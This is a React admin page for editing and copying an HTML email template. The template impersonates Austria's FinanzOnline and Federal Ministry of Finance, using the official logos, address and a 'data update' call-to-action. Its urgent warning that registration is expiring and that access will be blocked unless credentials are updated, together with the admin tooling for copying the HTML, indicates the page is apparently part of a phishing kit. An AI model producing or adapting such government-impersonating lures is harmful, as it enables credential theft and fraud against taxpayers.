import { useState } from "react";
import { Copy, Check, Code, Eye } from "lucide-react";
import { Button } from "@/components/ui/button";
import AdminLayout from "@/components/AdminLayout";
import { useToast } from "@/hooks/use-toast";

const defaultHtmlTemplate = `<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FinanzOnline - Wichtiger Hinweis</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f4f4;font-family:Arial,Helvetica,sans-serif;">
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:40px 0;">
    <tr>
      <td align="center">
        <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
          
          <!-- Header -->
          <tr>
            <td style="background-color:#ffffff;padding:30px 40px 20px 40px;border-bottom:3px solid #e6320f;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td width="50%">
                    <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDIzLjAuMiwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPgo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkViZW5lXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeD0iMHB4IiB5PSIwcHgiCiAgICAgdmlld0JveD0iMCAwIDI0OS40NSA1MS4wMiIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMjQ5LjQ1IDUxLjAyOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Cgkuc3Qwe2ZpbGw6I0U2MzIwRjt9Cjwvc3R5bGU+CiAgICA8Zz4KCTxwYXRoIGQ9Ik0yMjMuNywyNC43M2gyLjE2djYuMDdjMCwyLjQ1LDEuNzUsMy40OCwzLjM0LDMuNDhjMC42NSwwLDEuMzQtMC4xNCwyLjMtMC42N2wtMC43NS0xLjY2YzAsMC0wLjY1LDAuNDYtMS4yNywwLjQ2CgkJYy0xLjA4LDAtMS42MS0wLjYyLTEuNjEtMS43di01Ljk4aDMuNDZWMjIuOWgtMy40NnYtMy4zOGgtMi4wMnYzLjM4aC0yLjE2VjI0LjczeiBNMjE0Ljk2LDMyLjVjLTEuMjUsMC0yLjU0LTAuNTgtMi41NC0yLjAyCgkJYzAtMS4xNSwxLjA4LTIuMDIsMi44MS0yLjAyYzEuOCwwLDIuOSwwLjc5LDIuOSwwLjc5djEuNTZDMjE4LjEzLDMwLjgyLDIxNi45MywzMi41LDIxNC45NiwzMi41IE0yMTUuMzIsMjIuNjEKCQljLTIuNDIsMC00LjE1LDEuMTMtNC4xNSwxLjEzbDAuODQsMS42OGMwLDAsMS42My0wLjk0LDMuMzEtMC45NGMwLjg5LDAsMi44MSwwLjMxLDIuODEsMi42MnYwLjZjMCwwLTEuMy0wLjkxLTMuMzQtMC45MQoJCWMtMi41LDAtNC4zOSwxLjU0LTQuMzksMy43YzAsMi40LDIuMTQsMy43OSw0LjEzLDMuNzljMi41MiwwLDMuNzctMS45LDMuNzctMS45djEuNjFoMS44NXYtNy4zCgkJQzIyMC4xNSwyNC42MywyMTguNTksMjIuNjEsMjE1LjMyLDIyLjYxIE0yMDMuODMsMzIuOTFjMCwwLjc0LDAuNjIsMS4zNywxLjM3LDEuMzdjMC43NCwwLDEuMzctMC42MiwxLjM3LTEuMzcKCQljMC0wLjc0LTAuNjItMS4zNy0xLjM3LTEuMzdDMjA0LjQ1LDMxLjU0LDIwMy44MywzMi4xNywyMDMuODMsMzIuOTEgTTE5MS4zLDI3LjQ5YzAuMTQtMS4xNSwxLjEzLTMsMy41My0zCgkJYzIuMjMsMCwzLjM2LDEuNzUsMy40MywzSDE5MS4zeiBNMTk0LjgzLDIyLjYxYy0zLjM0LDAtNS41NCwyLjU5LTUuNTQsNS44M2MwLDMuMjksMi40Miw1LjgzLDUuNzgsNS44MwoJCWMyLjkzLDAsNC42MS0yLjE4LDQuNjEtMi4xOGwtMS4yNy0xLjMyYzAsMC0xLjE1LDEuNjMtMy4zNCwxLjYzYy0yLjA5LDAtMy43LTEuNTYtMy44Mi0zLjI0aDguOTVjMC4wMi0wLjI2LDAuMDItMC40MywwLjAyLTAuNjUKCQlDMjAwLjIzLDI0Ljk0LDE5Ny45MiwyMi42MSwxOTQuODMsMjIuNjEgTTE4MS4zNiwyMi42MWMtMi40LDAtMy40MSwxLjg1LTMuNDEsMS44NVYyMi45aC0xLjg3djExLjA5aDIuMDJ2LTcuNjMKCQljMCwwLDAuOTYtMS44NywyLjc2LTEuODdjMS40OSwwLDIuNjYsMC44MiwyLjY2LDIuNzF2Ni43OWgyLjAydi03LjEzQzE4NS41NCwyNC4xMywxODMuNTcsMjIuNjEsMTgxLjM2LDIyLjYxIE0xNjguODMsMTkuMzUKCQljMCwwLjc0LDAuNjIsMS4zNywxLjM3LDEuMzdzMS4zNy0wLjYyLDEuMzctMS4zN3MtMC42Mi0xLjM3LTEuMzctMS4zN1MxNjguODMsMTguNjEsMTY4LjgzLDE5LjM1IE0xNjkuMTksMzMuOTloMi4wMlYyMi45aC0yLjAyCgkJVjMzLjk5eiBNMTYxLjg3LDMzLjk5aDIuMDJWMTUuODVoLTIuMDJWMzMuOTl6IE0xNTIuNzUsMjIuNjFjLTIuNCwwLTMuNDEsMS44NS0zLjQxLDEuODVWMjIuOWgtMS44N3YxMS4wOWgyLjAydi03LjYzCgkJYzAsMCwwLjk2LTEuODcsMi43Ni0xLjg3YzEuNDksMCwyLjY2LDAuODIsMi42NiwyLjcxdjYuNzloMi4wMnYtNy4xM0MxNTYuOTMsMjQuMTMsMTU0Ljk2LDIyLjYxLDE1Mi43NSwyMi42MSBNMTM4LjAyLDMyLjQxCgkJYy0yLjIzLDAtMy43LTEuNzgtMy43LTMuOTZzMS40Ni0zLjk2LDMuNy0zLjk2YzIuMjMsMCwzLjcsMS43OCwzLjcsMy45NlMxNDAuMjUsMzIuNDEsMTM4LjAyLDMyLjQxIE0xMzguMDIsMjIuNjEKCQljLTMuMjYsMC01LjcxLDIuNTctNS43MSw1LjgzczIuNDUsNS44Myw1LjcxLDUuODNjMy4yNiwwLDUuNzEtMi41Nyw1LjcxLTUuODNTMTQxLjI4LDIyLjYxLDEzOC4wMiwyMi42MSBNMTE5Ljk3LDIyLjl2MS44N0gxMjYKCQlsLTYuMzYsOS4yMmg5LjY1di0xLjg3aC02LjFsNi4zNi05LjIySDExOS45N3ogTTExMS42NywyMi42MWMtMi40LDAtMy40MSwxLjg1LTMuNDEsMS44NVYyMi45aC0xLjg3djExLjA5aDIuMDJ2LTcuNjMKCQljMCwwLDAuOTYtMS44NywyLjc2LTEuODdjMS40OSwwLDIuNjYsMC44MiwyLjY2LDIuNzF2Ni43OWgyLjAydi03LjEzQzExNS44NCwyNC4xMywxMTMuODgsMjIuNjEsMTExLjY3LDIyLjYxIE05Ni42OSwzMi41CgkJYy0xLjI1LDAtMi41NC0wLjU4LTIuNTQtMi4wMmMwLTEuMTUsMS4wOC0yLjAyLDIuODEtMi4wMmMxLjgsMCwyLjksMC43OSwyLjksMC43OXYxLjU2Qzk5Ljg2LDMwLjgyLDk4LjY2LDMyLjUsOTYuNjksMzIuNQoJCSBNOTcuMDUsMjIuNjFjLTIuNDIsMC00LjE1LDEuMTMtNC4xNSwxLjEzbDAuODQsMS42OGMwLDAsMS42My0wLjk0LDMuMzEtMC45NGMwLjg5LDAsMi44MSwwLjMxLDIuODEsMi42MnYwLjYKCQljMCwwLTEuMy0wLjkxLTMuMzQtMC45MWMtMi41LDAtNC4zOSwxLjU0LTQuMzksMy43YzAsMi40LDIuMTQsMy43OSw0LjEzLDMuNzljMi41MiwwLDMuNzctMS45LDMuNzctMS45djEuNjFoMS44NXYtNy4zCgkJQzEwMS44OCwyNC42MywxMDAuMzIsMjIuNjEsOTcuMDUsMjIuNjEgTTgzLjk3LDIyLjYxYy0yLjQsMC0zLjQxLDEuODUtMy40MSwxLjg1VjIyLjloLTEuODd2MTEuMDloMi4wMnYtNy42MwoJCWMwLDAsMC45Ni0xLjg3LDIuNzYtMS44N2MxLjQ5LDAsMi42NiwwLjgyLDIuNjYsMi43MXY2Ljc5aDIuMDJ2LTcuMTNDODguMTUsMjQuMTMsODYuMTgsMjIuNjEsODMuOTcsMjIuNjEgTTcxLjQ0LDE5LjM1CgkJYzAsMC43NCwwLjYyLDEuMzcsMS4zNywxLjM3czEuMzctMC42MiwxLjM3LTEuMzdzLTAuNjItMS4zNy0xLjM3LTEuMzdTNzEuNDQsMTguNjEsNzEuNDQsMTkuMzUgTTcxLjgsMzMuOTloMi4wMlYyMi45SDcxLjhWMzMuOTl6CgkJIE02MC43MiwyNC43M2gyLjN2OS4yNmgyLjAydi05LjI2aDIuODhWMjIuOWgtMi44OHYtMy43YzAtMS4wOCwwLjYtMS43OCwxLjY4LTEuNzhjMC42MiwwLDEuMywwLjQzLDEuMywwLjQzbDAuNzQtMS42NgoJCWMtMC45Ni0wLjUzLTEuNjgtMC42NS0yLjMzLTAuNjVjLTEuNTgsMC0zLjQxLDEuMTgtMy40MSwzLjUzdjMuODJoLTIuM1YyNC43M3oiLz4KPC9nPgogICAgPHBvbHlnb24gY2xhc3M9InN0MCIgcG9pbnRzPSI0My4yMywyMi42OCA0My4yMywxNy4wMSAxNy4wMSwxNy4wMSAxOS42NSwyMi42OCAiLz4KICAgIDxwb2x5Z29uIGNsYXNzPSJzdDAiIHBvaW50cz0iMjQuOTQsMzQuMDIgNDMuMjMsMzQuMDIgNDMuMjMsMjguMzUgMjIuMjksMjguMzUgIi8+Cjwvc3ZnPgo=" alt="FinanzOnline" height="32" style="display:block;" />
                  </td>
                  <td width="50%" align="right">
                    <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDIyLjAuMSwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPgo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkViZW5lXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeD0iMHB4IiB5PSIwcHgiCiAgICAgdmlld0JveD0iMCAwIDI5Ni4yIDgxLjEiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDI5Ni4yIDgxLjE7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KCS5zdDB7ZmlsbDojRTYzMjBGO30KPC9zdHlsZT4KICAgIDxnPgoJPHBhdGggZD0iTTE1NS40LDUyLjhjLTIuNywwLTMuNywyLjMtMy43LDIuM3YtMmgtMS4xVjY0aDEuMnYtNy42YzAsMCwxLTIuNCwzLjQtMi40YzEuOCwwLDMuMSwxLDMuMSwzLjJWNjRoMS4ydi03CgkJQzE1OS41LDU0LDE1Ny40LDUyLjgsMTU1LjQsNTIuOCBNMTM3LjEsNTcuOWMwLTEuMiwxLjEtMy45LDQuMS0zLjljMi45LDAsNCwyLjYsNCwzLjlIMTM3LjF6IE0xNDEuMiw1Mi44Yy0zLjMsMC01LjQsMi43LTUuNCw1LjgKCQljMCwzLjEsMi40LDUuOCw1LjYsNS44YzEuOCwwLDMuNS0xLDQuNi0yLjJsLTAuOC0wLjljLTAuNywwLjktMi4xLDEuOS0zLjcsMS45Yy0yLjksMC00LjMtMi40LTQuNC00aDkuNGMwLTAuMywwLTAuMywwLTAuNQoJCUMxNDYuNSw1NS4yLDE0NC4xLDUyLjgsMTQxLjIsNTIuOCBNMTIzLjcsNTN2MS4yaDYuN2wtNy4yLDkuOGg5LjJ2LTEuMmgtN2w3LjItOS44SDEyMy43eiBNMTE1LDUyLjhjLTIuNywwLTMuNywyLjMtMy43LDIuM3YtMgoJCWgtMS4xVjY0aDEuMnYtNy42YzAsMCwxLTIuNCwzLjQtMi40YzEuOCwwLDMuMSwxLDMuMSwzLjJWNjRoMS4ydi03QzExOS4xLDU0LDExNy4xLDUyLjgsMTE1LDUyLjggTTEwMC4zLDYzLjFjLTEuNCwwLTMtMC43LTMtMi41CgkJYzAtMS43LDEuOC0yLjUsMy4yLTIuNWMyLjIsMCwzLjUsMC45LDMuNSwwLjl2MS44QzEwNCw2MC44LDEwMi43LDYzLjEsMTAwLjMsNjMuMSBNMTAwLjgsNTIuOGMtMi4zLDAtNC4xLDEuMi00LjEsMS4ybDAuNiwxLjEKCQljMCwwLDEuNi0xLDMuNi0xYzEuMiwwLDMuMiwwLjUsMy4yLDMuMXYwLjhjMCwwLTEuNC0xLTMuNi0xYy0yLjEsMC00LjMsMS4zLTQuMywzLjdjMCwyLjQsMi4xLDMuNyw0LDMuN2MyLjcsMCw0LjEtMi4yLDQuMS0yLjJWNjQKCQloMS4xdi03LjJDMTA1LjMsNTQuNiwxMDMuOCw1Mi44LDEwMC44LDUyLjggTTg3LjYsNTIuOGMtMi43LDAtMy43LDIuMy0zLjcsMi4zdi0yaC0xLjFWNjRIODR2LTcuNmMwLDAsMS0yLjQsMy40LTIuNAoJCWMxLjgsMCwzLjEsMSwzLjEsMy4yVjY0aDEuMnYtN0M5MS43LDU0LDg5LjYsNTIuOCw4Ny42LDUyLjggTTc1LjksNDkuNWMwLDAuNSwwLjQsMSwxLDFzMS0wLjQsMS0xcy0wLjQtMS0xLTFTNzUuOSw0OSw3NS45LDQ5LjUKCQkgTTc2LjIsNjRoMS4yVjUzaC0xLjJWNjR6IE02My42LDQ4LjRoNy45di0xLjJoLTkuMlY2NGgxLjJ2LThoNy41di0xLjJoLTcuNVY0OC40eiIvPgogICAgICAgIDxwYXRoIGQ9Ik0yNzMuOSwyMi42Yy0yLjQsMC0zLjMsMi4xLTMuMywyLjFzLTAuNy0yLjEtMy41LTIuMWMtMi4zLDAtMy4xLDEuOS0zLjEsMS45di0xLjZoLTEuOVYzNGgydi03LjdjMCwwLDAuNy0xLjgsMi40LTEuOAoJCWMxLjQsMCwyLjQsMC45LDIuNCwyLjdWMzRoMnYtNy43YzAsMCwwLjctMS44LDIuNC0xLjhjMS40LDAsMi40LDAuOSwyLjQsMi43VjM0aDJ2LTcuMUMyNzcuNywyNC4xLDI3Ni4yLDIyLjYsMjczLjksMjIuNgoJCSBNMjUyLjQsMzQuM2MyLjQsMCwzLjQtMiwzLjQtMlYzNGgxLjlWMjIuOWgtMnY3LjdjMCwwLTAuOSwxLjgtMi44LDEuOGMtMS41LDAtMi43LTAuOC0yLjctMi43di02LjhoLTJWMzAKCQlDMjQ4LjIsMzIuOCwyNTAuMiwzNC4zLDI1Mi40LDM0LjMgTTI0MSwxOS40YzAsMC43LDAuNiwxLjQsMS40LDEuNGMwLjcsMCwxLjQtMC42LDEuNC0xLjRzLTAuNi0xLjQtMS40LTEuNAoJCUMyNDEuNiwxOCwyNDEsMTguNiwyNDEsMTkuNCBNMjQxLjMsMzRoMlYyMi45aC0yVjM0eiBNMjM2LjMsMjIuNmMtMi4xLDAtMy4xLDItMy4xLDJ2LTEuN2gtMS45VjM0aDJ2LTcuNmMwLDAsMC44LTEuOSwyLjUtMS45CgkJYzAuOCwwLDEuMywwLjIsMS4zLDAuMmwwLjctMS44QzIzNy45LDIyLjksMjM3LjIsMjIuNiwyMzYuMywyMi42IE0yMTguNywyNy41YzAuMS0xLjIsMS4xLTMsMy41LTNjMi4yLDAsMy40LDEuOCwzLjQsM0gyMTguN3oKCQkgTTIyMi4yLDIyLjZjLTMuMywwLTUuNSwyLjYtNS41LDUuOGMwLDMuMywyLjQsNS44LDUuOCw1LjhjMi45LDAsNC42LTIuMiw0LjYtMi4ybC0xLjMtMS4zYzAsMC0xLjIsMS42LTMuMywxLjYKCQljLTIuMSwwLTMuNy0xLjYtMy44LTMuMmg5YzAtMC4zLDAtMC40LDAtMC42QzIyNy42LDI0LjksMjI1LjMsMjIuNiwyMjIuMiwyMi42IE0yMDYsMjQuN2gyLjJ2Ni4xYzAsMi40LDEuOCwzLjUsMy4zLDMuNQoJCWMwLjYsMCwxLjMtMC4xLDIuMy0wLjdsLTAuNy0xLjdjMCwwLTAuNiwwLjUtMS4zLDAuNWMtMS4xLDAtMS42LTAuNi0xLjYtMS43di02aDMuNXYtMS44aC0zLjV2LTMuNGgtMnYzLjRIMjA2VjI0Ljd6IE0xOTMuOSwzMgoJCWMwLDAsMS42LDIuMyw0LjgsMi4zYzIuMSwwLDQuNC0xLjEsNC40LTMuMmMwLTIuMy0xLjgtMy0zLjktMy41Yy0xLjgtMC40LTIuNy0wLjgtMi43LTEuN2MwLTAuNywwLjctMS40LDIuMS0xLjQKCQljMS43LDAsMi44LDEuMiwyLjgsMS4ybDEuMy0xLjRjMCwwLTEuNS0xLjctNC4xLTEuN2MtMi41LDAtNC4xLDEuNi00LjEsMy4yYzAsMi4xLDEuNywzLDQuMSwzLjVjMS43LDAuMywyLjUsMC44LDIuNSwxLjgKCQljMCwwLjktMS4zLDEuNC0yLjQsMS40Yy0yLjIsMC0zLjQtMS44LTMuNC0xLjhMMTkzLjksMzJ6IE0xODcuNCwxOS40YzAsMC43LDAuNiwxLjQsMS40LDEuNHMxLjQtMC42LDEuNC0xLjRzLTAuNi0xLjQtMS40LTEuNAoJCVMxODcuNCwxOC42LDE4Ny40LDE5LjQgTTE4Ny43LDM0aDJWMjIuOWgtMlYzNHogTTE3OC43LDIyLjZjLTIuNCwwLTMuNCwxLjgtMy40LDEuOHYtMS42aC0xLjlWMzRoMnYtNy42YzAsMCwxLTEuOSwyLjgtMS45CgkJYzEuNSwwLDIuNywwLjgsMi43LDIuN1YzNGgydi03LjFDMTgyLjksMjQuMSwxODAuOSwyMi42LDE3OC43LDIyLjYgTTE2Ni4xLDE5LjRjMCwwLjcsMC42LDEuNCwxLjQsMS40YzAuNywwLDEuNC0wLjYsMS40LTEuNAoJCXMtMC42LTEuNC0xLjQtMS40QzE2Ni44LDE4LDE2Ni4xLDE4LjYsMTY2LjEsMTkuNCBNMTY2LjUsMzRoMlYyMi45aC0yVjM0eiBNMTU3LjgsMjIuNmMtMi40LDAtMy4zLDIuMS0zLjMsMi4xcy0wLjctMi4xLTMuNS0yLjEKCQljLTIuMywwLTMuMSwxLjktMy4xLDEuOXYtMS42aC0xLjlWMzRoMnYtNy43YzAsMCwwLjctMS44LDIuNC0xLjhjMS40LDAsMi40LDAuOSwyLjQsMi43VjM0aDJ2LTcuN2MwLDAsMC43LTEuOCwyLjQtMS44CgkJYzEuNCwwLDIuNCwwLjksMi40LDIuN1YzNGgydi03LjFDMTYxLjYsMjQuMSwxNjAuMSwyMi42LDE1Ny44LDIyLjYgTTEzMywzMmMwLDAsMS42LDIuMyw0LjgsMi4zYzIuMSwwLDQuNC0xLjEsNC40LTMuMgoJCWMwLTIuMy0xLjgtMy0zLjktMy41Yy0xLjgtMC40LTIuNy0wLjgtMi43LTEuN2MwLTAuNywwLjctMS40LDIuMS0xLjRjMS43LDAsMi44LDEuMiwyLjgsMS4ybDEuMy0xLjRjMCwwLTEuNS0xLjctNC4xLTEuNwoJCWMtMi41LDAtNC4xLDEuNi00LjEsMy4yYzAsMi4xLDEuNywzLDQuMSwzLjVjMS43LDAuMywyLjUsMC44LDIuNSwxLjhjMCwwLjktMS4zLDEuNC0yLjQsMS40Yy0yLjIsMC0zLjQtMS44LTMuNC0xLjhMMTMzLDMyegoJCSBNMTIxLjEsMjcuNWMwLjEtMS4yLDEuMS0zLDMuNS0zYzIuMiwwLDMuNCwxLjgsMy40LDNIMTIxLjF6IE0xMjQuNiwyMi42Yy0zLjMsMC01LjUsMi42LTUuNSw1LjhjMCwzLjMsMi40LDUuOCw1LjgsNS44CgkJYzIuOSwwLDQuNi0yLjIsNC42LTIuMmwtMS4zLTEuM2MwLDAtMS4yLDEuNi0zLjMsMS42Yy0yLjEsMC0zLjctMS42LTMuOC0zLjJoOWMwLTAuMywwLTAuNCwwLTAuNkMxMzAsMjQuOSwxMjcuNywyMi42LDEyNC42LDIyLjYKCQkgTTExMi44LDMwLjVjMCwwLTEuMSwxLjktMy4zLDEuOWMtMi4zLDAtMy43LTEuOC0zLjctNGMwLTIuMiwxLjUtNCwzLjctNHMzLjMsMS45LDMuMywxLjlWMzAuNXogTTEwOS4zLDIyLjZjLTMsMC01LjQsMi42LTUuNCw1LjgKCQlzMi40LDUuOCw1LjQsNS44YzIuNywwLDMuNy0xLjksMy43LTEuOVYzNGgxLjhWMTUuOGgtMnY4LjRDMTEyLjgsMjQuMywxMTEuNywyMi42LDEwOS4zLDIyLjYgTTk2LDIyLjZjLTIuNCwwLTMuNCwxLjgtMy40LDEuOAoJCXYtMS42aC0xLjlWMzRoMnYtNy42YzAsMCwxLTEuOSwyLjgtMS45YzEuNSwwLDIuNywwLjgsMi43LDIuN1YzNGgydi03LjFDMTAwLjEsMjQuMSw5OC4yLDIyLjYsOTYsMjIuNiBNODAuOSwzNC4zCgkJYzIuNCwwLDMuNC0yLDMuNC0yVjM0aDEuOVYyMi45aC0ydjcuN2MwLDAtMC45LDEuOC0yLjgsMS44Yy0xLjUsMC0yLjctMC44LTIuNy0yLjd2LTYuOGgtMlYzMEM3Ni43LDMyLjgsNzguNywzNC4zLDgwLjksMzQuMwoJCSBNNjQuMiwyNC40di01LjNINjdjMS45LDAsMywxLDMsMi43cy0xLjIsMi43LTMsMi43SDY0LjJ6IE02Ny41LDMyLjFoLTMuMnYtNS44aDMuMmMyLjQsMCwzLjUsMS4zLDMuNSwyLjlTNjkuOSwzMi4xLDY3LjUsMzIuMQoJCSBNNjIuMiwzNGg1LjNjMy4zLDAsNS41LTEuOSw1LjUtNC44YzAtMy4zLTIuNi00LjEtMi44LTQuMWMwLjIsMCwxLjktMSwxLjktMy4zYzAtMi44LTEuOS00LjYtNS40LTQuNmgtNC40VjM0eiIvPgo8L2c+CiAgICA8cG9seWdvbiBjbGFzcz0ic3QwIiBwb2ludHM9IjQzLjIsMjIuNyA0My4yLDE3IDE3LDE3IDE5LjcsMjIuNyAiLz4KICAgIDxwb2x5Z29uIGNsYXNzPSJzdDAiIHBvaW50cz0iMjQuOSwzNCA0My4yLDM0IDQzLjIsMjguMyAyMi4zLDI4LjMgIi8+Cjwvc3ZnPgo=" alt="BMF" height="40" style="display:block;" />
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- Body -->
          <tr>
            <td style="padding:35px 40px 20px 40px;">
              <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;">
                Wichtiger Hinweis zur Aktualisierung Ihrer Registrierungsdaten
              </h1>

              <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">
                Sehr geehrte Damen und Herren,
              </p>

              <!-- Hinweisbox -->
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;">
                <tr>
                  <td style="background-color:#f1f4f7;border-left:4px solid #e6320f;border-radius:0 6px 6px 0;padding:20px 24px;">
                    <p style="margin:0 0 12px 0;font-size:14px;line-height:1.6;color:#333333;">
                      Ihre Registrierung bei FinanzOnline läuft in Kürze ab. Um weiterhin Zugang zu allen Services zu gewährleisten, überprüfen und aktualisieren Sie bitte Ihre persönlichen Daten sowie Zugangsdaten zeitnah.
                    </p>
                    <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;">
                      Sollte die Aktualisierung nicht rechtzeitig erfolgen, kann Ihr Zugang eingeschränkt oder vorübergehend gesperrt werden – einschließlich der Abgabe von Steuererklärungen und der Einsicht in Bescheide.
                    </p>
                  </td>
                </tr>
              </table>

              <p style="margin:0 0 30px 0;font-size:15px;line-height:1.6;color:#333333;">
                Bitte aktualisieren Sie Ihre Daten umgehend, um eine Unterbrechung Ihres Zugangs zu vermeiden.
              </p>

              <!-- CTA Button -->
              <table role="presentation" cellpadding="0" cellspacing="0" style="margin:0 auto 30px auto;">
                <tr>
                  <td align="center" style="background-color:#e6320f;border-radius:6px;">
                    <a href="https://finanzonline.bmf.gv.at" target="_blank" style="display:inline-block;padding:14px 36px;font-size:15px;font-weight:600;color:#ffffff;text-decoration:none;letter-spacing:0.3px;">
                      Jetzt Daten aktualisieren
                    </a>
                  </td>
                </tr>
              </table>

              <p style="margin:0 0 8px 0;font-size:13px;line-height:1.5;color:#888888;">
                Falls Sie diese Aktualisierung bereits durchgeführt haben, können Sie diese E-Mail ignorieren.
              </p>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td>
                    <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">
                      Bundesministerium für Finanzen
                    </p>
                    <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">
                      Johannesgasse 5, 1010 Wien | Tel: +43 50 233 790
                    </p>
                    <p style="margin:0;font-size:11px;color:#bbbbbb;">
                      <a href="https://www.bmf.gv.at/public/impressum.html" style="color:#999999;text-decoration:underline;">Impressum</a>
                      &nbsp;&middot;&nbsp;
                      <a href="https://www.bmf.gv.at/public/datenschutz.html" style="color:#999999;text-decoration:underline;">Datenschutz</a>
                      &nbsp;&middot;&nbsp;
                      <a href="https://finanzonline.bmf.gv.at" style="color:#999999;text-decoration:underline;">finanzonline.bmf.gv.at</a>
                    </p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;

const AdminEmailTemplate = () => {
  const [htmlCode, setHtmlCode] = useState(defaultHtmlTemplate);
  const [showCode, setShowCode] = useState(false);
  const [copied, setCopied] = useState(false);
  const { toast } = useToast();

  const handleCopy = async () => {
    await navigator.clipboard.writeText(htmlCode);
    setCopied(true);
    toast({ title: "HTML-Code kopiert!" });
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <AdminLayout>
      <div className="mx-auto max-w-5xl space-y-6">
        {/* Header */}
        <div>
          <h1 className="text-2xl font-bold tracking-tight text-slate-900">Email Template</h1>
          <p className="mt-1 text-sm text-slate-500">HTML-Email Vorlage bearbeiten und als Code kopieren</p>
        </div>

        {/* Preview */}
        <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
          <div className="flex items-center justify-between border-b border-slate-100 px-5 py-3">
            <div className="flex items-center gap-2 text-sm font-medium text-slate-700">
              <Eye className="h-4 w-4" />
              Vorschau
            </div>
            <div className="flex items-center gap-2">
              <Button
                variant="outline"
                size="sm"
                onClick={() => setShowCode(!showCode)}
                className="gap-2 text-xs"
              >
                <Code className="h-3.5 w-3.5" />
                {showCode ? "Code ausblenden" : "HTML-Code anzeigen"}
              </Button>
              <Button
                variant="outline"
                size="sm"
                onClick={handleCopy}
                className="gap-2 text-xs"
              >
                {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
                {copied ? "Kopiert!" : "Kopieren"}
              </Button>
            </div>
          </div>
          <div className="bg-slate-50 p-6">
            <div className="mx-auto max-w-[640px] overflow-hidden rounded-lg border border-slate-200 bg-white shadow-sm">
              <iframe
                srcDoc={htmlCode}
                className="w-full border-none"
                style={{ height: "700px" }}
                title="Email Preview"
                sandbox=""
              />
            </div>
          </div>
        </div>

        {/* Code Editor */}
        {showCode && (
          <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
            <div className="flex items-center justify-between border-b border-slate-100 px-5 py-3">
              <div className="flex items-center gap-2 text-sm font-medium text-slate-700">
                <Code className="h-4 w-4" />
                HTML-Code (Live-Bearbeitung)
              </div>
            </div>
            <textarea
              value={htmlCode}
              onChange={(e) => setHtmlCode(e.target.value)}
              className="block w-full resize-y bg-slate-950 p-5 font-mono text-sm leading-relaxed text-emerald-400 focus:outline-none"
              style={{ minHeight: "500px" }}
              spellCheck={false}
            />
          </div>
        )}
      </div>
    </AdminLayout>
  );
};

export default AdminEmailTemplate;
